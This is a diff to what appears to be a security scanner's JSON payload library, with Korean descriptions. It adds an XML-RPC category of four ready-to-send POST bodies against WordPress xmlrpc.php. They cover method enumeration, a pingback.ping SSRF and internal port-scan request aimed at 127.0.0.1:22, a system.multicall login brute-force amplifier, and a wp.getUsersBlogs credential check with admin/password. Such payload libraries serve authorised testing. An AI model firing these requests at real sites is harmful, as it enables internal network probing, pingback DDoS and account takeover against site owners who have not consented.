@@ -4853,6 +4853,103 @@
       ]
     },
     {
+      "id": "xmlrpc",
+      "name": "XML-RPC (xmlrpc.php)",
+      "icon": "🔌",
+      "color": "#f0883e",
+      "group": "server",
+      "payloads": [
+        {
+          "id": "xmlrpc_listmethods",
+          "name": "system.listMethods (메서드 열거)",
+          "payload": "/xmlrpc.php",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "text/xml"
+          },
+          "risk": "medium",
+          "description": "xmlrpc.php 활성 및 노출 메서드 열거 — pingback·multicall·인증 메서드 확인",
+          "applies_to": {
+            "path_contains": [
+              "xmlrpc"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
+        },
+        {
+          "id": "xmlrpc_pingback_ssrf",
+          "name": "pingback.ping (SSRF/포트스캔)",
+          "payload": "/xmlrpc.php",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "text/xml"
+          },
+          "risk": "high",
+          "description": "pingback.ping 으로 내부망 SSRF/포트스캔·pingback DDoS 시도(대상 URL은 상황에 맞게 수정)",
+          "applies_to": {
+            "path_contains": [
+              "xmlrpc"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://127.0.0.1:22/</string></value></param><param><value><string>http://TARGET/?p=1</string></value></param></params></methodCall>"
+        },
+        {
+          "id": "xmlrpc_multicall_bruteforce",
+          "name": "system.multicall (brute-force 증폭)",
+          "payload": "/xmlrpc.php",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "text/xml"
+          },
+          "risk": "high",
+          "description": "multicall 로 다수 로그인 시도를 한 요청에 묶는 brute-force 증폭",
+          "applies_to": {
+            "path_contains": [
+              "xmlrpc"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>wrong1</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>"
+        },
+        {
+          "id": "xmlrpc_getusersblogs_auth",
+          "name": "wp.getUsersBlogs (인증 brute-force 표면)",
+          "payload": "/xmlrpc.php",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "text/xml"
+          },
+          "risk": "medium",
+          "description": "wp.getUsersBlogs 로 자격증명 검증 — 인증 메서드 활성 여부(brute-force 표면) 확인",
+          "applies_to": {
+            "path_contains": [
+              "xmlrpc"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>"
+        }
+      ]
+    },
+    {
       "id": "cve",
       "name": "알려진 취약점 (CVE)",
       "icon": "🎯",
